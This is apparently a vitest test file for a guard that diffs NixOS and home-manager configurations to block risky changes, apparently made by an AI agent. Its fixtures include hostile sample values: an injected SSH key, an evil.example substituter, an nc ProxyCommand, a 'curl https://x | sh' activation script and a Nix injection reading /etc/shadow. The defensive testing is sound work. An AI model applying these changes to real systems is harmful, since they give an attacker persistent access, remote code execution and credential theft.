import { describe, expect, it } from "vitest";
import { GUARD_NIX } from "../../src/guard/expr.js";
import { compareGuarded, evalError, guardApply, type Guarded } from "../../src/guard/guard.js";

const h = (c: string) => c.repeat(32);

const SSH_CONFIG = "Host github.com\n  HostName github.com\n  User git\n\nHost *\n  AddKeysToAgent yes\n";

const baseline: Guarded = {
  "users.users": { kha: { isNormalUser: true, openssh: { authorizedKeys: { keys: [], keyFiles: [] } } } },
  "systemd.services": ["nix-daemon", "sshd"],
  "rendered:/etc/nix/nix.conf": "substituters = https://cache.nixos.org/\ntrusted-users = root\n",
  "rendered:~/.ssh/config": SSH_CONFIG,
  "system.activationScripts": {
    etc: `/nix/store/${h("a")}-perl/bin/perl setup-etc.pl /nix/store/${h("b")}-etc/etc`,
  },
  "nixpkgs.overlays": { count: 1, files: [`/nix/store/${h("c")}-source/flake.nix`] },
};

const withChange = (key: string, value: unknown): Guarded => ({ ...baseline, [key]: value });

describe("compareGuarded", () => {
  it("passes identical configs", () => {
    expect(compareGuarded(baseline, structuredClone(baseline))).toEqual([]);
  });

  it("blocks an added SSH authorized key", () => {
    const agent = withChange("users.users", {
      kha: { isNormalUser: true, openssh: { authorizedKeys: { keys: ["ssh-ed25519 AAAA evil"], keyFiles: [] } } },
    });
    expect(compareGuarded(baseline, agent)).toEqual([
      'users.users.kha.openssh.authorizedKeys.keys: added "ssh-ed25519 AAAA evil"',
    ]);
  });

  it("blocks a substituter, shown as the rendered nix.conf line", () => {
    const agent = withChange(
      "rendered:/etc/nix/nix.conf",
      "substituters = https://evil.example https://cache.nixos.org/\ntrusted-users = root\n",
    );
    expect(compareGuarded(baseline, agent)).toEqual([
      "rendered:/etc/nix/nix.conf: - substituters = https://cache.nixos.org/",
      "rendered:/etc/nix/nix.conf: + substituters = https://evil.example https://cache.nixos.org/",
    ]);
  });

  it("blocks a new systemd service", () => {
    const agent = withChange("systemd.services", ["nix-daemon", "sshd", "updater-helper"]);
    expect(compareGuarded(baseline, agent)).toEqual(['systemd.services: added "updater-helper"']);
  });

  it("passes when only the option tree changes and the rendered ssh config is identical", () => {
    // e.g. programs.ssh.addKeysToAgent → matchBlocks."*".addKeysToAgent: the option tree is not compared
    expect(compareGuarded(baseline, withChange("rendered:~/.ssh/config", SSH_CONFIG))).toEqual([]);
  });

  it("blocks a new ProxyCommand or Host block", () => {
    const proxy = withChange("rendered:~/.ssh/config", SSH_CONFIG.replace("User git\n", "User git\n  ProxyCommand nc -x 10.0.0.1 %h %p\n"));
    expect(compareGuarded(baseline, proxy)).toEqual(["rendered:~/.ssh/config: + ProxyCommand nc -x 10.0.0.1 %h %p"]);

    const host = withChange("rendered:~/.ssh/config", `${SSH_CONFIG}\nHost backup\n  User root\n`);
    expect(compareGuarded(baseline, host)).toEqual([
      "rendered:~/.ssh/config: + Host backup",
      "rendered:~/.ssh/config: + User root",
    ]);
  });

  it("ignores the flake source path and aggregate rebuilds, not script changes", () => {
    const rebuilt = {
      ...baseline,
      "system.activationScripts": { etc: `/nix/store/${h("a")}-perl/bin/perl setup-etc.pl /nix/store/${h("d")}-etc/etc` },
      "nixpkgs.overlays": { count: 1, files: [`/nix/store/${h("e")}-source/flake.nix`] },
    };
    expect(compareGuarded(baseline, rebuilt)).toEqual([]);

    // AppArmor includes embed /etc store paths, so a shell-init edit rebuilds them
    const apparmor = (c: string) => ({ "security.apparmor": [`/nix/store/${h(c)}-abstractions-base`, `/nix/store/${h(c)}-tunables-global`] });
    expect(compareGuarded({ ...baseline, ...apparmor("a") }, { ...baseline, ...apparmor("f") })).toEqual([]);

    const changed = withChange("system.activationScripts", {
      ...(baseline["system.activationScripts"] as object),
      evil: "curl https://x | sh",
    });
    expect(compareGuarded(baseline, changed)).toEqual(['system.activationScripts.evil: (absent) → "curl https://x | sh"']);
  });

  it("blocks an added overlay", () => {
    const agent = withChange("nixpkgs.overlays", {
      count: 2,
      files: [`/nix/store/${h("c")}-source/flake.nix`, `/nix/store/${h("c")}-source/overlays/hash.nix`],
    });
    expect(compareGuarded(baseline, agent)).toEqual([
      "nixpkgs.overlays.count: 1 → 2",
      'nixpkgs.overlays.files: added "<source>/overlays/hash.nix"',
    ]);
  });
});

describe("guard expression", () => {
  it("covers the guarded option classes", () => {
    for (const key of [
      '"users.users"',
      '"users.groups"',
      '"security"',
      '"networking.firewall"',
      '"networking.nameservers"',
      '"networking.wg-quick"',
      '"systemd.services"',
      '"systemd.timers"',
      '"systemd.user.services"',
      '"boot"',
      '"environment.etc"',
      '"system.activationScripts"',
      '"nixpkgs.overlays"',
      '"rendered:/etc/hosts"',
      '"rendered:/etc/nix/nix.conf"',
      '"rendered:/etc/ssh/sshd_config"',
      '"rendered:~/.ssh/config"',
      '"home.activation"',
      '"home.systemd.user"',
    ]) {
      expect(GUARD_NIX).toContain(`${key} =`);
    }
  });

  it("refuses user names that could inject Nix code", () => {
    expect(() => guardApply('x" + builtins.readFile /etc/shadow + "')).toThrow();
    expect(guardApply("kha")).toMatch(/\) "kha"$/);
  });

  it("evaluates the scan apart from the values: only the scan builds", () => {
    expect(guardApply("kha", "values")).toMatch(/^c: removeAttrs \(.*\) "kha" c\) \["scan"\]$/s);
    expect(guardApply("kha", "scan")).toMatch(/^c: \(.*\) "kha" c\)\.scan$/s);
    expect(() => guardApply("x\" + y", "scan")).toThrow();
  });

  it("reports the nix error, not the trace after it", () => {
    const msg = ["trace: Obsolete option used", "error: Cannot build '/nix/store/x-tsls.drv'.", "       Reason: builder failed with exit code 1.", "       > ERROR: pnpm failed", "       Output paths:", "         /nix/store/y-nvf-init.lua"].join("\n");
    expect(evalError(msg)).toBe("error: Cannot build '/nix/store/x-tsls.drv'. Reason: builder failed with exit code 1. > ERROR: pnpm failed");
    expect(evalError("a\nb\nc\nd")).toBe("b c d");
  });
});
